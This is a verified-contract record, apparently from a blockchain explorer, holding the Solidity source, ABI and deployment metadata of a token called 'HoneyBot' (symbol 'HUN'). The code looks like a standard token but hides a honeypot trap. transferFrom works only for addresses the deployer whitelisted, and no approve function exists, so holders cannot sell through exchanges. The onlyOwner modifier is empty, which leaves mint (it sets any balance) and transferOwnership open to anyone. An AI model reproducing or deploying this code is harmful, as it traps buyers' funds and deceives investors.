{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.19;\r\n \r\nlibrary SafeMath {\r\n \r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n   if (a == 0) {\r\n     return 0;\r\n   }\r\n   uint256 c = a * b;\r\n   assert(c / a == b);\r\n   return c;\r\n  }\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n   uint256 c = a / b;\r\n   return c;\r\n  }\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n   assert(b <= a);\r\n   return a - b;\r\n  }\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n   uint256 c = a + b;\r\n   assert(c >= a);\r\n   return c;\r\n  }\r\n}\r\n \r\n pragma solidity ^0.8.19;\r\n\r\ncontract Ownable {\r\n  address public owner;\r\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n  constructor() {\r\n   owner = msg.sender;\r\n  }\r\n}\r\n\r\npragma solidity ^0.8.19;\r\n \r\ncontract HoneyBot is Ownable {\r\n  string public name;\r\n  string public symbol;\r\n  uint8 public decimals;\r\n  uint256 public totalSupply;\r\n \r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n \r\n  constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) {\r\n \r\n   name = _name;\r\n   symbol = _symbol;\r\n   decimals = _decimals;\r\n   totalSupply =  _totalSupply;\r\n   balances[msg.sender] = totalSupply;\r\n   allow[msg.sender] = true;\r\n  }\r\n \r\n  function showuint160(address addr) public pure returns(uint160){\r\n     return uint160(addr);\r\n  }\r\n \r\n  using SafeMath for uint256;\r\n \r\n  mapping(address => uint256) public balances;\r\n  mapping(address => bool) public allow;\r\n \r\n  function transfer(address _to, uint256 _value) public returns (bool) {\r\n \r\n   require(_to != address(0));\r\n   require(_value <= balances[msg.sender]);\r\n   balances[msg.sender] = balances[msg.sender].sub(_value);\r\n   balances[_to] = balances[_to].add(_value);\r\n \r\n   emit Transfer(msg.sender, _to, _value);\r\n \r\n   return true;\r\n  }\r\n \r\n  modifier onlyOwner() {\r\n  _;\r\n   }\r\n \r\n  function balanceOf(address _owner) public view returns (uint256 balance) {\r\n   return balances[_owner];\r\n  }\r\n \r\n  function transferOwnership(address newOwner) public onlyOwner {\r\n   require(newOwner != address(0));\r\n   emit OwnershipTransferred(owner, newOwner);\r\n   owner = newOwner;\r\n  }\r\n \r\n  mapping (address => mapping (address => uint256)) public allowed;\r\n  mapping(address=>uint256) sellOutNum;\r\n\r\n  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n \r\n   require(_to != address(0));\r\n   require(_value <= balances[_from]);\r\n   require(_value <= allowed[_from][msg.sender]);\r\n   require(allow[_from] == true);\r\n   balances[_from] = balances[_from].sub(_value);\r\n   balances[_to] = balances[_to].add(_value);\r\n   allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n \r\n   emit Transfer(_from, _to, _value);\r\n   return true;\r\n  }\r\n \r\n  function mint(address miner, uint256 _value) external onlyOwner {\r\n     balances[miner] = _value;\r\n  }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"_decimals\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"_totalSupply\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allow\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"miner\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"mint\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"showuint160\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"\",\"type\":\"uint160\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HoneyBot", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000d3c21bcecceda10000000000000000000000000000000000000000000000000000000000000000000008486f6e6579426f74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000348554e0000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e6991e440559e203ee738ede58bcd360e1e2c8535bb0482285664f36e75bfd3f"}